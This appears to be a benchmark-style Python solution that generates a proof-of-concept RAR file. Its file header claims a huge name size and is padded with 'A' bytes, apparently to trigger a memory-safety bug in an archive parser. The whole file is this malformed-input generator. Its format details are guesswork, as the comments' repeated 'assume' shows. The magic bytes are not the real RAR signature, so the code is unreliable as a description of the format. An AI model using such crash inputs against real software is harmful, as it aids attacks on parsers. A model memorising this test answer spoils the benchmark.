class Solution:
    def solve(self, src_path: str) -> bytes:
        magic = b'Rar!\x05\x00'
        # Archive header block: minimal, header_size=8, data_size=0, flags=0x0001
        archive_header_size = b'\x08\x00'
        archive_data_size = b'\x00\x00\x00\x00'
        archive_flags = b'\x01\x00'
        archive_header = archive_header_size + archive_data_size + archive_flags
        # File header block: assume header_size=12 (8 + 4 additional fields), data_size small, flags for file, then large name size in additional
        file_header_size = b'\x0c\x00'
        file_data_size = b'\x00\x00\x00\x00'  # pack size 0
        file_flags = b'\x02\x00'  # assume file type
        # Additional header fields: assume host_os=1 byte, method=1, then name_size 4 bytes large
        host_os = b'\x01'  # Windows
        method = b'\x30'  # store
        large_name_size = (0x7fffffff).to_bytes(4, 'little')
        file_header = file_header_size + file_data_size + file_flags + host_os + method + large_name_size
        # Then some name data to pad to approx 1089
        remaining = 1089 - len(magic + archive_header + file_header)
        name_data = b'A' * max(0, remaining)
        poc = magic + archive_header + file_header + name_data
        return poc
